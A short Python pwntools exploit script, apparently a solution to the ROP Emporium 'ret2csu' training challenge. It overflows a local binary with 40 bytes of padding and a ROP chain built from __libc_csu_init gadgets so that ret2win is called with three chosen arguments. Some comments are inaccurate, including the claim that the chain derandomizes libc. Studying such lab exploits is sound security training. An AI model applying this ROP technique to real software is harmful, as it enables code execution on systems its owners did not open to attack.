from pwn import context, ELF, gdb, packing, process, ROP

e = ELF("ret2csu")
p = process(e.path)

#gadget 1 = pop_rbp; pop_r12; pop_r13; pop_r14; pop_r15; ret
gadget1 = 0x40069b
rbx = 0x0
rbp = 0x1
fini = 0x600e48          #doesn't actually call fini it just stores this address to be called at the end so we can fill rdi properly
arg1 = 0xdeadbeefdeadbeef   #edi
arg2 = 0xcafebabecafebabe   #rsi
arg3 = 0xd00df00dd00df00d   #rdx

#gadget 2 = mov rdx r15; mov rsi r14; mov edi r13
gadget2 = 0x400680

ret2win = 0x40062a

'''
using the provided gadgets in __libc_csu_init we can construct a rop chain to derandomize libc

if we want ret2win to be called during call qword ptr [r12+rax*8], then we can set rax as 0x0, 
and then r12 as the value for ret2win
'''
junk = b"A" * 40
chain = [gadget1, rbp, fini, arg1, arg2, arg3, gadget2, 0x0,0x1,0x0,0x0,0x0,0x0,0x0, 0x4006a3, 0xdeadbeefdeadbeef, ret2win]
rop = b"".join([packing.p64(r) for r in chain])

p.recvuntil("> ")
#input() #debug
p.send(junk + rop)
p.interactive()
